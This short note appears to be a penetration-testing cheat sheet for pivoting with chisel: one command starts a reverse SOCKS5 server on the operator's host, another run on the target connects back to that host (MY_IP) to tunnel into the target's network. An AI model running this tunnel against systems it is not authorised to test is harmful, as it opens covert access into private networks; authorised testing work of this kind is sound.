My serv (MY_IP)
```
chisel server --reverse --socks5 -p 9000
```

Target
```
chisel client MY_IP:9000 R:127.0.0.1:socks
```
